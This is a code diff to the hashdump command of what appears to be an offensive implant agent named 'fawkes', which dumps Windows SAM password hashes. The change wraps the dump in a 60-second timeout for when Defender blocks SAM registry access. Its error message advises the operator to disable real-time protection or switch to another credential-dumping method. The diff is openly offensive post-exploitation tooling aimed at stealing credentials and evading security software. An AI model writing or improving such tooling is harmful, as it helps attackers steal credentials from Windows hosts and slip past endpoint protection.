@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -43,6 +44,22 @@ type hashdumpArgs struct {
 }
 
 func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
+	// Run with a timeout to prevent hanging the agent if security software
+	// blocks SAM registry access (observed on Windows 11 with Defender).
+	resultCh := make(chan structs.CommandResult, 1)
+	go func() {
+		resultCh <- c.executeInner(task)
+	}()
+
+	select {
+	case result := <-resultCh:
+		return result
+	case <-time.After(60 * time.Second):
+		return errorf("Hashdump timed out after 60s — security software may be blocking SAM registry access.\nConsider disabling real-time protection or using an alternative credential dumping method.")
+	}
+}
+
+func (c *HashdumpCommand) executeInner(task structs.Task) structs.CommandResult {
 	// Note: runtime.LockOSThread() was removed — SYSTEM process token grants
 	// SeBackupPrivilege on all threads, and LockOSThread was causing process
 	// crashes during response delivery after hashdump completed.
